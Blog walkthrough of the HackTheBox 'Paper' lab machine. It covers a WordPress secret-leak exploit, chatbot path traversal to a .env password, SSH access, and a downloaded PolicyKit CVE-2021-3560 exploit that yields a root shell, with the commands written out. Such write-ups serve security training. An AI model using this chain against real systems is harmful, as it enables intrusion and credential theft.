<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Paper HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/paper-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-19T16:36:47+00:00">December 19, 2022</time><time class="updated" datetime="2025-06-19T14:16:38+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Paper is regarded as a simple box, or hackthebox, that runs Linux. We’ll start with a simple port scan on this box and proceed laterally. Next, in order to find the secret chat domain, we will list all of the domain names and take use of a weakness in the WordPress plugin that allows secrets to leak. Then, in order to gain the first foothold on the target computer, we will make a new user account, list every communication, and utilize the bot feature to access the private file. The next step will be to obtain root access, which we will do by taking advantage of a policy kit vulnerability discovered by Kevin Backhouse in 2021. A root shell will appear if the exploit is successfully executed.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
<ul>
<li><span style="color: #000000;">TCP Port Scan</span></li>
<li><span style="color: #000000;">Initial Enumeration</span></li>
<li><span style="color: #000000;">Find Domain Name</span></li>
<li><span style="color: #000000;">Web Page Enumeration</span></li>
<li><span style="color: #000000;">Searching For the Exploit</span></li>
<li><span style="color: #000000;">Secrets leaking Vulnerability Exploitation</span></li>
<li><span style="color: #000000;">Subdomain Enumeration</span></li>
<li><span style="color: #000000;">Bot Feature Abuse</span></li>
<li><span style="color: #000000;">User Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">PolicyKit Exploit: CVE-2021-3560</span></li>
<li><span style="color: #000000;">Root Flag</span></li>
</ul>
<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
<h3><span style="color: #800000;">Initial Access</span></h3>
<p><span style="color: #000000;">We are going to start the assessment with the normal TCP/IP port scanning.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>TCP Port Scan</strong></span></span></h4>
<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open and what services are running in the target host. Nmap is a popular port scanning tool come with Kali Linux. In order to perform port scan, we have used –<strong>sV</strong> flag which performs a service version scan against the target machine.</span></p>
<p><span style="color: #000000;">Flags features:</span></p>
<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap  -sV 10.129.74.162</pre>
<p><span style="color: #000000;">From the nmap scan, we have found there were only three ports open, which is port <strong>22,80</strong> and port <strong>443</strong>. As usual <strong>HTTP service</strong> is running on port 80, <strong>HTTPS</strong> service is running on port 443 and the <strong>SSH service </strong>is running on port 22. Both HTTP and HTTPS service is used for the webhosting and the SSH service is used for remote connection. SSH version is the latest, and we did not find any vulnerabilities on SSH version 8.0 and the possible attack we can perform against the SSH service at this stage is bruteforce only which we might not need to do. Instead of thinking about the SSH bruteforce let’s start enumerating port 80 and 443.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRZb246ahrzPrLy7p8vBU3jJfUB0XqPZ0eEGQg1JaImB8m8C4gmQir10SE818EabllpfLgCkalGNfsu8rnGqacadA_SiBNbVdLbwy453DE15w6kZEJHqE2ZrEO8kRe_tswLKhWaEaJbttBTakJX0N7r_ekjx-oTrp5QbMCZaeAt0tDB10krJf7PH6v4Q/s16000/1.png"/></span></p>
<h4><strong><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">Initial Enumeration</span></span></strong></h4>
<p><span style="color: #000000;">We begin enumeration by accessing port 80 and 443 over browser. Webpage does not have many interesting things. From the web page, we found it is showing default page of <strong>CentOS</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">htttp://10.129.74.162</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpmVzL26cqrALLxWTo1V5u8CIMbmgqcSsjZWBteqKQ55YbZX4SF6xYs5QkTLBv9U9SrGE3wmpJRvVVMIovg2xjBdNse88CQV-jqS06ceUrewhei1xOXKdyUXXITwxsfooeaITaFKCym3UenwC3cxUy4_LHbKjALNVs8nUs0kn4MYnsMxc12BFoBHsmQQ/s16000/2.png"/></strong></span></p>
<h4><strong><span style="color: #000000;"><span style="text-decoration: underline;">Find Domain Name</span> </span></strong></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl -I 10.129.74.162</pre>
<p><span style="color: #000000;">Flags features:</span></p>
<p><span style="color: #000000;"><strong>-I</strong>: Include protocol response headers in the output</span></p>
<p><span style="color: #000000;">Further enumeration of the output result, we see X-backend-server revealed its domain name which is <strong>office.paper </strong>We have used Kali inbuilt tool called curl.</span></p>
<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://everything.curl.dev/project">https://everything.curl.dev/project</a></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEil3DhSHT205uFuScczyTDvVUcgZgk1RiJ5Z2cGiggSoV2EqJh2oa2_YVm_LSuJMnkgjgJj6auZdtYm7F3Zj7vT_yLpHpVoGgFo9e6txxVp9iUoXx-znzKeBjUy3s8JnGfh2y8_E0yCLutv0c92ShX6_RNZ0jexiu0dhGRlTjGsMN4qBhwDp8an3U2Uaw/s16000/3.png"/></span></p>
<p><span style="color: #000000;">After finding the domain name we are adding it to /etc/hosts file in the attacking machine. To add to host’s file you can use any text editor such as leafpad, gedit, nano or vim.</span></p>
<h5><span style="color: #000000;"><strong>Why do we need to add domain in the local hosts file?</strong></span></h5>
<p><span style="color: #000000;">The /etc/hosts file contains a mapping of IP addresses to URLs. Your browser uses entries in the /etc/hosts file to override the IP-address-to-URL mapping returned by a DNS server. This is useful for testing DNS (domain name system) changes and the SSL configuration before making a website live.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJA-sSKPCo38hzrygK4-w13wFptHkRicxjYDN8yD6RFly_dliuwZJjNmK8EkeUS3ZOqiIlxNZpV3NYrkf67ceAyAWFCEpH4AQgPt6AjN-tCX6oSNxLf5WTcm30rNxlsTGaJaBhP-3HQaqf-xF8oCK41HEO6xUG_Jn_3jL4Weqrb34QlCKoaCHtgXZGfA/s16000/4.png"/></span></p>
<h4><strong><span style="color: #000000;"><span style="text-decoration: underline;">Web Page Enumeration</span> </span></strong></h4>
<p><span style="color: #000000;">Once we add domain name in the /etc/hosts file, we continued our enumeration process and checked HTTP and HTTPS services. From the HTTP service, we got a different page this time. The pages include a company name which is <strong>Blunder Tiffin Paper Company.  </strong>Also, we can see someone has left a comment there that everyone has removed from the blog and there is only one user present now. Also, we noted a name (<strong>Jan</strong>) which can be a potential username and can be useful in our further assessment.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMzKwfVeD293U3sLKFk7V8DSxWeRjlwb_B1dtdxvegZjh_Zl6Dp-Q1hfYYhLhKNoGKWZ838gCYYAAXM9YtRNUIB4GNzcOe8TEE3Z30GDp9jL6YRPf49n6OSobMxtgH8-9aZ2eELfESRAtIr_eNhOdkU6eu0q3_uuwmCMijHEhrsyItHf88xc1x96zeYg/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Then we checked the technologies used in the web page and found it is hosted in WordPress. WordPress is popular for having various vulnerabilities in it. From the wappalyzer result, we found that WordPress 5.2.3 is used. We have used a browser-add on called wappalyzer to find out the technology stacks.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx3CcIKYfoSJnMShP0l07SmutUDoM1Sx-u1_6vrppPVq45Fhy474sBorgv_2d87cTN-byEzDI1lsxg4Q6G-iQkv2iAqOYfhXHK8qigZcTVpkah0EgInhWcCOqZguUjZCfoWLW5NHWx2wEa0xoMpuGJdJkRHRBARKrTnPDsefoHD5qITGCnmguyZnjpOA/s16000/6.png"/></strong></span></p>
<h4><strong><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">Searching For the Exploit</span></span></strong></h4>
<p><span style="color: #000000;">As we have WordPress version, we searched for the exploit using Kali pre-installed tool called <strong>searchsploit</strong>.  We found two exploits were there and based on our scenario we decided to go with the second one which has given a description that an unauthenticated user can retrieve secrets. Searchsploit is a command line tool with similar results as we get from the exploit database. Here are the commands to reproduce the Prove of concept (POC). Please note, <strong>-m</strong> flag is used to download the exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit WordPress 5.2.3
searchsploit -m 47690
cat 47690.md</pre>
<p><span style="color: #000000;">After reading the exploit we found that adding<strong>? static=1 </strong>can leak its secret contents which can be password or any other information that can be helpful for our further assessment.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIpo55uVCrhlnFAVshc6jHLyAvYPke6GqMXwF4b_5Ku-tPMxlB69KlZESOCydbTCQ_a6O_wXgCHK6laiTBEEPd623t2YsEhTmxejbIlWDiItO6g-w2KGRA7U42uQ-BGlLu686Dto7c-AYX7NYgBVJ-n2-zHddN85LPEQuzrCe4IFu1zdGWFBQJQY8ERw/s16000/7.png"/></strong></span></p>
<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">Secrets leaking Vulnerability Exploitation</span> </strong></span></h4>
<p><span style="color: #000000;">As exploit mentioned that adding? static=1 in the URL will leak secrets, we tested by providing the below URL and found a subdomain URL</span></p>
<p><span style="color: #000000;"><span style="color: #0000ff;"><strong>http://chat.office.papaer/register/8qozr226AhkCHZdyY</strong></span></span></p>
<p><span style="color: #000000;">URL: <span style="color: #0000ff;">http://office.paper/?static=1</span></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_Gu3ounCBf2mGq5lM4-iVrqF3eyV1xXycvwL1MovG0Numrb6lXD_Q-eSyERAYs7byWM8qCMfYQ7_QEFuplATK0aRQ8uEmgliDAdwJk6V86mKIMVPxsEWVgk68lpCJ0UOJF6C1BRXqJgU7KtKyhMaJL1h8QziObU8f4buFgUoMj5slTmIm_5V5q-sSiw/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Let’s add chat.office.paper to /etc/hosts file again.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDmTEaiyzwAx0n2yX7ASIgOBE-CuUQsE9aHT4zxmn23er5QhuBm-8MYjb9FH-FFsg_uzBMZov__lOrX4P9g34xJGgaYjb2LpNE5m1EnfxoEV-yglvN0DKTH6Qz835gD5c35ggjL901AvpPdIsZGw9WQQwn4Ui489lJ79RCfxvFepePh33OuOv08DYUIA/s16000/10.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Subdomain Enumeration</strong></span></span></h4>
<p><span style="color: #000000;">After adding subdomain to the hosts file, we accessed it over the browser and found a <strong>rocket.chat </strong>CMS which is used for chatting. Being a penetration tester always two things come into mind what we have and what else we can do with that. So far, we do not have valid credentials to log in, we accessed the URL that we found after exploitation of the vulnerability earlier.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://chat.office.papaer/register/8qozr226AhkCHZdyY</pre>
<p><span style="color: #000000;">Accessing the below URL, we got a register page where we registered as a new user. We created a user named raj and given a fake email address and password to register an account.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzkDenedbBaHOxSDlmv1pb1pb8y_mhBYVQHriqjvVeLnT9exsI7YGdbP0719f5QIA1tl9TqRKgWLw-BYzEiqIR9l6zfXFFUpPMH0Y28ZslmCYbCnq5IiyySP-zYlB30hUHtpI9n9TUKGUQB0MzQ1Acr3zidu89gkmB5JZE0qCAnA3ARtz5uyE_o0EYlg/s16000/11.png"/></span></p>
<h4><strong><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">Rocket Chat CMS Enumeration</span></span></strong></h4>
<p><span style="color: #000000;">We logged in as new user raj into the rocket.chat CMS and read all the conversations of other users from the general channel. There are 3 users and one bot user.</span></p>
<p><span style="color: #000000;">After reading their messages, we found that <strong>DwightKSchrute</strong> has assigned a bot named<strong> recyclops</strong> to help other users to answer common queries. Furthermore, he has also mentioned that a user can call bot by typing <strong>recyclops help</strong> in their chat windows and bot will be there to help them.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEEU1dd4QR9wGJCI_L3JJl783QgBxebsyPm6Qgvc7cTGbbx3K0rcdrJRKUZjWp3SwWlerc_dF-bk66nffjDM4SPsZR9O0g3Ujs7usd4i-Dpw7X-Z6qkCEZadZ_i63MO3IBRWG9wMh3tgFm3qo6CW0wZByWAYBALxIcbaSzDTYvlGbNr2eP5EeAzuAwmw/s16000/12.png"/></span></p>
<p><span style="color: #000000;">As we can see in the above picture when someone called bot for the help a default message come into the screen about the bot itself and instructions. If we have closer look into the messages, we can see there are some frequently asked questions. Furthermore, it has a feature to receive answers to our queries directly in our message box as well.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEgd10rxVnNSM2K4MXTUWOekvnuwT3BoYX2QIIvkWRzBj05avvItwspROq0MjhLjjO1rizz4JtJuG0dKg3GZI2HKTCsB1S-_7wtG55-Fu2fGO6NCWGJUG1oVmZaO7gxqsHubcgetG34-KZ9cp61w2EixDJ4Zi_5Wo091MQbVFz8VYg7xcbWE19Yw8QmA/s16000/13.png"/></span></p>
<p><span style="color: #000000;">As we have logged in as raj user, which is a new account we created earlier, we are calling recyclops by typing <strong>help</strong> into the chat window. The same message and instructions came into our chat windows which confirms that recyclops is activated.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbdit1h12akL3NccLMO3oh4ahaVW6iVqp0PUoxok1QUlj3IMWmlxZ7Zh75kKeaFvt5jixppmdRSh39mbX6GQdL1Nohql1zwDGqqVAnxjAG_cZhu4RwNoH-T1OY7e8-fgAZFD140RPRKtPDoeNvW9wiXWXotx4WgXlC_8kkwlsD6bX_7gDhPZDqcjtNwA/s16000/14.png"/></span></p>
<p><span style="color: #000000;">When we scroll down to check all the features and services provided by the recyclops. We notice that we can also list the files from some shared directories and get those files with the help of the bot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8YiHtd_ETA5zTgyBET75s_nlRoDyDoLIL-DL-IO_9Ewb7kbcAOgf3s69FC67asvq-RHsUOcpomRRTW8iLEFm3cuT9EPclYOvyMTRkAF0oa4c5O8R2ZtkPVPH3N8jNwriAYZJzxsHoV_holevK-KZ1cBDaq6SSEN9ehdmmz3D4XH_W9Dr9UwbStXQYyw/s16000/15.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Bot Feature Abuse</strong></span></span></h4>
<p><span style="color: #000000;">From the above message of the bot, we got to know that it has a limited feature set to a particular folder. Recylops can only list and get files from the sales directory only we decided to list what sales directory contains by providing <strong>list</strong> command in the chat window.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_IKPIqUbENwRUkVAgEeYnUCPstni8o6ew03FDhjOWA5nTwPbtxaSUiqcUdySrnNxxHMj3ip84-kIlkeLY5EJYW1OGARJRxUBBo5LPbAevIzluQXcgPQdBgOCnKj1aMdIfn0QhVYrXZc3CiYb4ydQ17wgXVsEeNwqqmrK3m-IlPfGX3dsDMKyKmdWVMA/s16000/16.png"/></span></p>
<p><span style="color: #000000;">From the output, we found that there is a user <strong>Dwight</strong> present there and a <strong>sale</strong> folder in the sales directory. Then we decided to enumerate further by going one step back from the sales directory and we got into Dwight home directory. There we saw a non-standard directory (<strong>hubot</strong>) present in the Dwight home directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKUi0zrKcXzpPnrleTjXVUdVuDC1-vslJWMrG_nVruY7ZKQ8ccYYGkZ0calpgZYaLk28PiHA0ApYT9xV_zi3yQYVsFTYJHJrAEsSbf3bbR29r2ZYeFTiNOLEw5GryuPok9Dv6dGa72rtgMBGtsMUN-KGMT_iTw-QJCOgtgV6kT8Xr4a4rBRkACf8J0hQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Next, we checked the non-standard directory and listed all the files present in the hubot and notice there is <strong>.env</strong> file present there. Let’s talk about the environment files in the Linux system and why it is important to enumerate them.</span></p>
<h5><span style="color: #000000;"><strong>What is env file?</strong></span></h5>
<p><span style="color: #000000;">.env files are <strong>used to store those variables</strong> and they should be written in all uppercase separated with underscores for naming convention. we access those variables through process.env after installing dotnev npm package.</span></p>
<p><span style="color: #000000;">Why it is important to check environment files?</span></p>
<p><span style="color: #000000;">These environment files may contain password in plain taxed format as well as in base64 format. If an attacker found any secrets from this file, then he/she can leverage a user account.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQ9KTXy8U0NtSPNTgcSKm6KteH8_U2jxzFFQMAWw37lAaubUMg6tIRDJmA_HWfGZCJgCL0jjPT7A12zhc88qA7ObSTT9nDW833TatC9oGVm0nAWF93bvSEMUekByd9WBGHticCYxgRneVfb9cPvrhZxI1BI4Yj59MWXf_e0KQEwLVvoXbfGAA8Bt-N2Q/s16000/18.png"/></span></p>
<p><span style="color: #000000;">Now we know the importance of the environment files in a Linux distribution. Let’s check .env file to test the theory we have discussed above. We can view the file contests by providing directory path and the file name with <strong>file</strong> command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">file ../hubot/.env</pre>
<p><span style="color: #000000;">As we can see a plain texted password from the .env file. We got the password but not the username so, from the penetration testing methodology we can check this password against all users that we have seen in the messages. We tested obtained password on SSH service against all users and got success on <strong>Dwight. </strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: dwight
Password: Queenofblad3s!23</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilQwsSiUpOqjs59eEf_i8kkzGL_qjLHV5HMniVMxW0coxAe4EzVY7NkVneF9B9VrkVJEf3oDbeMR1VGrq462wOhty2UlQdjh9tyBxyZgWM4jGATuCMHoFMdi6542pnVC5c-h8zFdqQY4Kz-rcDDlS5WFqgZTIjXaXVvAmWQEByaBy6d-qiYqsDjAQopA/s16000/19.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>User flag</strong></span></span></h4>
<p><span style="color: #000000;">We successfully logged in via SSH as Dwight into the target machine. We can grab the user flag from the user home directory. Also, we need to escalate privilege, so we transferred <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a> </strong></span>script into the target /tmp directory. Please note, we need to setup the python server into our kali machine to transfer the script to the target machine.  Also, we have given full permission to the linpeas script to execute it. For more information about Linux file permissions, feel free to visit the below link:</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.guru99.com/file-permissions.html#:~:text=Linux%20divides%20the%20file%20permissions,ownership%20of%20a%20file%2Fdirectory">https://www.guru99.com/file-permissions.html#:~:text=Linux%20divides%20the%20file%20permissions,ownership%20of%20a%20file%2Fdirectory</a>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh dwight@10.129.74.162
python3 -m http.server 80
wget 10.10.14.12/linpeas.sh
chmod 777 linpeas.sh 
./linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-R3hL-Kzo8T3kNW4gxUPx71lRs4h020ChnU55hHg8nKoBJnUeTF5FgygLbBkWtPKJzA4IuHYpMtXZiIGj48ZX2iJh5izxKl3VdlaOTOa2hcAapBLJeSjS9j5ZFxx4e3ngO6KKI36mZlcqDGcN4murAbTBmibeGf6ah1dpqztS0GFOmjy_jjkAKdM2LA/s16000/20.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">From the linpeas output, we saw few CVEs appear as red which means these CVEs could be potential exploits which may help us to escalate privilege to the root account. A privilege escalation attack is <strong>a cyberattack designed to gain unauthorized privileged access into a system</strong>. Attackers exploit human behaviours, design flaws or oversights in operating systems or web applications.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>PolicyKit Exploit: CVE-2021-3560</strong></span></span></h4>
<p><span style="color: #000000;">After searching those exploits, we found many of them require compiling, so we decided to go with CVE-2021-3560 as all these 3 exploits work similarly based on the target system dependencies. Then we found a nice article about the policy kit exploitation the in the Hacking articles which has very clear instructions to exploit it. The full article is available in the below link:</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/">https://www.hackingarticles.in/linux-privilege-escalation-polkit-cve-2021-3560/</a></span></p>
<p><span style="color: #000000;">Background of the vulnerability can be found here:</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/</a></span></p>
<p><span style="color: #000000;">Reference of the exploit we have used here:</span></p>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py</a></span></p>
<p><span style="color: #000000;">We simply downloaded the exploit from the github into our kali machine and transferred it to the target machine as we did earlier to transfer linpeas.  We used wget command to download the exploit from GitHub, you may use other utilities as well such as curl.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghnugKkyEwcmQiD4TGMf01uA4NgrT_By7Bhcxs0NMGZ09dQH8Y3yRH7Nb2R1__i1H7I3tojyL4nHvEcLyPb19bDmgM-GV3FSLKr-kDaLNV2Z1Fr2Tb2DzFbKKSJeCC5StOWVD805aWB0MkVsw7lQBpzZ300D6En0JiI1O5IHTuOVUJzC-MxBPsJeFn_A/s16000/22.png"/></span></p>
<p><span style="color: #000000;">On the target side we downloaded the <strong>CVE-2021-3560.py</strong> exploit to the target /tmp directory with wget command. Then we execute the python script with python3.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.12/ CVE-2021-3560.py
python3 CVE-2021-3560.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFAr1D4nOZg0shEzGpxvTurQb5t9l-IHsrojp5H08TBex36YWS5-8XvsazPNUYWxGYU5uBgUakosDPhKeRrNeWIGFuEqxXoNFb4uBo72rry5_12YDEj_nq6RWdz76TQF0pN0-SoROQct3GrHYKKbtFdptxpUY_CYOT-FeZI608wzowzLKsyNDwGiNIOw/s16000/23.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Root Flag</strong></span></span></h4>
<p><span style="color: #000000;">After the successful execution of the script, it spawned a root shell. Now we can grab root flag from the root directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkALY9wyk69BHWaaLIBtkxxFbWKeHXPmCa3fRNIDcLlEV6tM9-CxMWWvwfLXy7SHKT9LJ_QlYhQkzFtEZZS5row8f-z71E2-xJMgVnxEDv2Ru8UiAuvZCDwJJ5tcIqPBrGyhRwp6ZVMY2pq_0HP8oVbqFlAKFXl2UKJmvE7nWFXvpLWMv78z11L8VJHw/s16000/24.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, service enumeration, Information leakage vulnerability, chatbot feature abuse, file transfer, file permissions, the importance of environment file in the Linux and policy kit vulnerability to perform local privilege escalation.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here</span><strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a></span></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
